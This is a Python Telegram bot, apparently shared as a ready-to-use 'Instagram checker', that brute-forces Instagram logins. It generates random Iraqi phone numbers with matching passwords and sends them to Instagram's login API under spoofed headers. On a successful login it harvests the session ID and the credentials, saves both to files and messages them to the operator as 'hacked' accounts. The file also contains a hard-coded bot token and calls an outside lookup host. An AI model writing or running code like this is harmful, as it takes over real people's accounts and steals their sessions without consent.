#Imports

try:

	import telebot	import requests

	import random

	import uuid

	import re

except:

	os.system('pip install random')

	os.system('pip install logging')

	os.system('pip install mechanize')

	os.system('pip install uuid')

	os.system('pip uninstall telebot')

	os.system('pip uninstall PyTelegramBotAPI')

	os.system('pip install PyTelegramBotAPI==3.6.7')

from logging import exception

import telebot

from telebot import types

import requests

import random

import uuid

import re

#Token

bot = telebot.TeleBot("1383917536:AAG88mYbhSShvG-c2vx75D78d71j4y5cjLQ")

#InlineKeyboardButton

Start = types.InlineKeyboardButton(text='Start ▶️', callback_data='Start ▶️')

reboot = types.InlineKeyboardButton(text='Reboot Bot ✳️', callback_data='Reboot Bot ✳️')

stop = types.InlineKeyboardButton(text='Stop 🛑', callback_data='s')

markup_inline12 = types.InlineKeyboardMarkup()

SendD = types.InlineKeyboardButton(text='Send Done List ✅', callback_data='sd')

Sends = types.InlineKeyboardButton(text='Send Session Id List 📜', callback_data='ss')

markup_inline12.add(stop)

#Variables

bad = 0

Done = 0

checkpoint = 0

checked = 0

ErrorUsers = 0

Run = True

#Melcome Message

@bot.message_handler(commands=['start'])

def start(message):

    try:

        if message.chat.type == 'private':

            markup_inline = types.InlineKeyboardMarkup()

            markup_inline.row_width = 2

            markup_inline.add(Start,SendD,Sends,reboot)

            bot.send_message(message.chat.id, f'*Ξ INSTAGRAM CHECKER 🤍*\n\n*Ξ DEVELOPER : @ZzBoTs - @PiPPi*', parse_mode='markdown',reply_markup=markup_inline)

    except:

        pass

#Send Done 

def send(message):

    try:

        send = open('Done.txt', 'rb')

        bot.send_document(message.chat.id, send)

    except:

        pass

#Send Session Id

def sends(message):

    try:

        send = open('Session Id.txt', 'rb')

        bot.send_document(message.chat.id, send)

    except:

        pass

#Reboot Bot

def Reboot(message):

    try:

        global Run,checked,bad,Done,checkpoint,ErrorUsers

        bad = 0

        Done = 0

        checkpoint = 0

        ErrorUsers = 0

        checked = 0

        Run = True

        open("Session Id.txt", "w")

        open("Done.txt", "w")

        bot.send_message(message.chat.id, text='''*𝗕𝗼𝘁 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝘁𝗮𝗿𝘁𝗲𝗱 ▶️ 

𝗖𝗹𝗶𝗰𝗸 /start  𝗧𝗼 𝘀𝘁𝗮𝗿𝘁 𝗯𝗼𝘁 (:*''', parse_mode='markdown')

    except:

        pass

 #Call Back

@bot.callback_query_handler(func=lambda call: True)

def answer(call):

    try:

        global Run

        #Send Session Id

        if call.data == "ss":

            sends(call.message)

        if call.data == "sd":

            send(call.message)

        # Send Start

        if call.data == 'Start ▶️':

            check(call.message)

        

        #Send Stop

        if call.data == 's':

            Run = False

            bot.send_message(call.message.chat.id, text='𝗜 𝗔𝗠 𝗦𝗧𝗢𝗣 ⏸')

        

        #Send Reboot

        if call.data == "Reboot Bot ✳️":

            Reboot(call.message)

    except:

        pass

#Check

def check(message):

    try:

        global Run,bad,checkpoint,Done,checked,ErrorUsers

        user = '0987654321'

        bot.send_message(message.chat.id,text="*Started (:*",parse_mode="markdown")

        while Run == True:

                #Random

                us = str("".join(random.choice(user)for i in range(7)))        

                username = '+964783'+us

                password = '0783'+us

                #Phone Id

                uid = uuid.uuid4()

                #Send Request

                url = 'https://i.instagram.com/api/v1/accounts/login/'

                headers = {

                                    'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  

                                    'Accept':'*/*', 

                                    'Cookie':'missing', 

                                    'Accept-Encoding':'gzip, deflate', 

                                    'Accept-Language':'en-US', 

                                    'X-IG-Capabilities':'3brTvw==', 

                                    'X-IG-Connection-Type':'WIFI', 

                                    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 

                                    'Host':'i.instagram.com'

                }

                data = {

                                'uuid':uid,

                                'password':password, 

                                'username':username, 

                                'device_id':uid, 

                                'from_reg':'false', 

                                '_csrftoken':'missing', 

                                'login_attempt_countn':'0'

                }

                reqq= requests.post(url, headers=headers, data=data, allow_redirects=True)

                checked +=1

                if 'bad_password' in reqq.text:

                                bad +=1

                                #Edit Message

                                bot.edit_message_text(chat_id=message.chat.id, text=f'*𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️\n\nΞ 𝗜𝗻 :   {username+":"+password}\n\nΞ [✅] 𝗗𝗼𝗻𝗲 :   {Done}\n\nΞ [❌] 𝗕𝗮𝗱 :   {bad}\n\nΞ [⚠️] 𝗦𝗰𝘂𝗿𝗲 :   {checkpoint}\n\nΞ [🛑] 𝗘𝗿𝗿𝗼𝗿 :   {ErrorUsers}*', parse_mode='markdown', message_id=message.message_id +1,reply_markup=markup_inline12)

                elif 'checkpoint_challenge_required' in reqq.text:

                                checkpoint +=1

                                #Edit Message

                                bot.edit_message_text(chat_id=message.chat.id, text=f'*𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️\n\nΞ 𝗜𝗻 :   {username+":"+password}\n\nΞ [✅] 𝗗𝗼𝗻𝗲 :   {Done}\n\nΞ [❌] 𝗕𝗮𝗱 :   {bad}\n\nΞ [⚠️] 𝗦𝗰𝘂𝗿𝗲 :   {checkpoint}\n\nΞ [🛑] 𝗘𝗿𝗿𝗼𝗿 :   {ErrorUsers}*', parse_mode='markdown', message_id=message.message_id +1,reply_markup=markup_inline12)

                                #Send Message

                                bot.send_message(message.chat.id, text=f'*ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕᴡᴏʀᴅ : {password}\n⌯ ụѕᴇʀɴᴀᴍᴇ  : ?\n⌯ ғᴏʟʟᴏᴡᴇʀѕ : ?\n⌯ ғᴏʟʟᴏᴡɪɴɢ : ?\n⌯ ᴘᴏѕᴛ : ?\n⌯ ᴅᴀᴛᴇ : ?\n⌯ ѕᴛᴀᴛụѕ : ѕᴄụʀᴇ ⚠️\n— — — — —  — — — — —\nғʀᴏᴍ : @ZzBoTs - @PiPPi*',parse_mode="markdown")

                elif 'pk' in reqq.text:

                                #Get Id

                                id = re.findall('''"pk":(.*?),"''',reqq.text)[0]

                                #Get Date

                                getdate = requests.get("https://o7aa.pythonanywhere.com/?id="+id)

                                date = re.findall('''"data": (.*?), "''',getdate.text)[0]

                                Done +=1

                                #Get Session Id

                                session_id = reqq.cookies['sessionid']

                                with open("Session Id.txt", "a")as an:

                                    an.write(session_id+"\n")

                                with open("Done.txt", "a")as an:

                                    an.write(username+":"+password+"\n")

                                url = 'https://i.instagram.com/api/v1/users/{}/info/'.format(id)

                                headers = {

                                'accept': '*/*',

                                'accept-encoding': 'gzip, deflate, br',

                                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',

                                'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={session_id}',

                                'origin': 'https://www.instagram.com',

                                'referer': 'https://www.instagram.com/',

                                'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',

                                'sec-ch-ua-mobile': '?0',

                                'sec-fetch-dest': 'empty',

                                'sec-fetch-mode': 'cors',

                                'sec-fetch-site': 'same-site',

                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',

                                'x-ig-app-id': '936619743392459',

                                'x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgbG4'

                            }

                                #Send Request

                                re1 = requests.get(url, headers=headers)

                                if 'user' in re1.text:

                                    #Get Info

                                    user1 = str(re1.json()['user']['username'])

                                    folower = str(re1.json()['user']['follower_count'])

                                    following = str(re1.json()['user']['following_count'])

                                    post = str(re1.json()['user']['media_count'])

                                    #Edit Message

                                    bot.edit_message_text(chat_id=message.chat.id, text=f'*𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️\n\nΞ 𝗜𝗻 :   {username+":"+password}\n\nΞ [✅] 𝗗𝗼𝗻𝗲 :   {Done}\n\nΞ [❌] 𝗕𝗮𝗱 :   {bad}\n\nΞ [⚠️] 𝗦𝗰𝘂𝗿𝗲 :   {checkpoint}\n\nΞ [🛑] 𝗘𝗿𝗿𝗼𝗿 :   {ErrorUsers}*', parse_mode='markdown', message_id=message.message_id +1,reply_markup=markup_inline12)

                                    #Send Message

                                    bot.send_message(message.chat.id, text=f'*ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕᴡᴏʀᴅ : {password}\n⌯ ụѕᴇʀɴᴀᴍᴇ  : {user1}\n⌯ ғᴏʟʟᴏᴡᴇʀѕ : {folower}\n⌯ ғᴏʟʟᴏᴡɪɴɢ : {following}\n⌯ ᴘᴏѕᴛ : {post}\n⌯ ᴅᴀᴛᴇ : {date}\n⌯ ѕᴛᴀᴛụѕ : ᴏᴋ ✅\n— — — — —  — — — — —\nғʀᴏᴍ : @ZzBoTs - @PiPPi*',parse_mode="markdown")

                else:

                    ErrorUsers +=1

                    #Edit Message

                    bot.edit_message_text(chat_id=message.chat.id, text=f'*𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️\n\nΞ 𝗜𝗻 :   {username+":"+password}\n\nΞ [✅] 𝗗𝗼𝗻𝗲 :   {Done}\n\nΞ [❌] 𝗕𝗮𝗱 :   {bad}\n\nΞ [⚠️] 𝗦𝗰𝘂𝗿𝗲 :   {checkpoint}\n\nΞ [🛑] 𝗘𝗿𝗿𝗼𝗿 :   {ErrorUsers}*', parse_mode='markdown', message_id=message.message_id +1,reply_markup=markup_inline12)

    except Exception as em:

        print(em)

bot.polling(True)
